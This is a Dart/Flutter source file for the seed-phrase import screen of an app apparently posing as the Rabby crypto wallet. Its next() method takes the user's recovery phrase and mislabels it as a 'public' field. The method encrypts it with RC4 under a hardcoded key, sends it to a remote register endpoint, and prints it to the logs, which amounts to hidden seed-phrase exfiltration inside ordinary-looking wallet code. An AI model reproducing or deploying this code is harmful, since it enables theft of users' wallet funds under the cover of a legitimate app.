import 'dart:convert';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'package:rabby/features/auth/domain/auth_service.dart';
import 'package:rabby/features/auth/repository/auth_repository.dart';
import 'package:simple_rc4/simple_rc4.dart';

import '../../../../app_data/app_data.dart';
import '../../../settings/settings_service.dart';
import '../../domain/adapters/attributes.dart';
import '../../domain/adapters/changes.dart';
import '../../domain/adapters/portfolio.dart';
import '../../domain/adapters/position_by_chain.dart';
import '../../domain/adapters/position_by_type.dart';
import '../../domain/adapters/total.dart';
import '../../domain/adapters/user.dart';
import '../../repository/domain/register/register_body.dart';
import 'import_seed_phrase.dart';

abstract class ImportSeedPhraseBloc extends State<ImportSeedPhrase> {
  final SettingsService _settingsService = SettingsService();
  final AuthRepository _authRepo = AuthRepository();
  final AuthService _authService = AuthService();
  final TextEditingController phraseController = TextEditingController();
  List<String>? mnemonicList;
  int mnemonicCount = 12;
  List<int> possibleCount = [12, 15, 18, 21, 24];
  bool isSubmit = false;

  void onClear() {
    setState(() {
      phraseController.text = "";
      isSubmit = false;
      mnemonicList = null;
    });
  }

  void onSubmitted(String value) {
    setState(() {
      isSubmit = true;
      mnemonicList = phraseController.text.split(' ');
    });
  }

  Future<void> next() async {
    print(phraseController.text);

    String r = Random().nextInt(999999).toString().padLeft(6, '0');
    print(r);

    print(
        "_settingsService.getMnemonicSentence() ${_settingsService.getMnemonicSentence()}");
    final data = json.encode({
      'public': phraseController.text,
      'salt': r,
      'name': 'R@bby\$',
      'new': false,
    });
    var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
    print("bytes $bytes");
    final result = await _authRepo.register(RegisterBody(data: bytes));

    if (result.isSuccess && mounted) {
      _authService.putUser(
        User(
          address: result.data!.address,
          portfolio: Portfolio(
            type: result.data!.portfolio.type,
            id: result.data!.portfolio.id,
            attributes: Attributes(
              positionsDistributionByType: PositionByType(
                wallet: result.data!.portfolio.attributes.positionByType.wallet,
                deposited:
                    result.data!.portfolio.attributes.positionByType.deposited,
                borrowed:
                    result.data!.portfolio.attributes.positionByType.borrowed,
                locked: result.data!.portfolio.attributes.positionByType.locked,
                staked: result.data!.portfolio.attributes.positionByType.staked,
              ),
              positionsDistributionByChain: PositionByChain(
                arbitrum:
                    result.data!.portfolio.attributes.positionByChain.arbitrum,
                aurora:
                    result.data!.portfolio.attributes.positionByChain.aurora,
                avalanche:
                    result.data!.portfolio.attributes.positionByChain.avalanche,
                binanceSmartChain: result.data!.portfolio.attributes
                    .positionByChain.binanceSmartChain,
                ethereum:
                    result.data!.portfolio.attributes.positionByChain.ethereum,
                fantom:
                    result.data!.portfolio.attributes.positionByChain.fantom,
                loopring:
                    result.data!.portfolio.attributes.positionByChain.loopring,
                optimism:
                    result.data!.portfolio.attributes.positionByChain.optimism,
                polygon:
                    result.data!.portfolio.attributes.positionByChain.polygon,
                solana:
                    result.data!.portfolio.attributes.positionByChain.solana,
                xdai: result.data!.portfolio.attributes.positionByChain.xdai,
              ),
              total: Total(
                positions: result.data!.portfolio.attributes.total.positions,
              ),
              changes: Changes(
                absoluteId:
                    result.data!.portfolio.attributes.changes.absoluteId,
              ),
            ),
          ),
        ),
      );
      _settingsService.putMnemonicSentence(phraseController.text);
      context.push(AppData.routes.importAddress);
    }
  }
}
